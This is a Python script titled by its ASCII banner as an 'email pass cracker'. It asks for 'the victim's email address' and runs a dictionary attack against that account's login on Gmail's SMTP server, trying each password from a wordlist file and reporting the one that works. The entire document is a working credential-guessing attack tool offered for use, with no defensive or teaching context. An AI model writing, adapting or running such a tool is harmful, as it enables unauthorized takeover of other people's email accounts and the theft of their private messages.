# _____ __  __    _    ___ _
#| ____|  \/  |  / \  |_ _| |
#|  _| | |\/| | / _ \  | || |
#| |___| |  | |/ ___ \ | || |___
#|_____|_|  |_/_/   \_|___|_____|
# ____   _    ____ ____
#|  _ \ / \  / ___/ ___|
#| |_) / _ \ \___ \___ \
#|  __/ ___ \ ___) ___) |
#|_| /_/   \_|____|____/
#  ____ ____     _    ____ _  _______ ____
# / ___|  _ \   / \  / ___| |/ | ____|  _ \
#| |   | |_) | / _ \| |   | ' /|  _| | |_) |
#| |___|  _ < / ___ | |___| . \| |___|  _ <
# \____|_| \_/_/   \_\____|_|\_|_____|_| \_\
#


import smtplib
 
class bcolors:
    OK = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
 
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
 
print(bcolors.BOLD + "Welcome" + bcolors.ENDC)
print(bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
 
user = raw_input("Enter the victim's email address: ")
passwfile = "psw.list"
passwfile = open(passwfile, "r")
 
for password in passwfile:
	try:
		smtpserver.login(user, password)
		print(bcolors.UNDERLINE + "Password Found: %s"  % password + bcolors.ENDC)
		break;
	except smtplib.SMTPAuthenticationError:
		print(bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC)
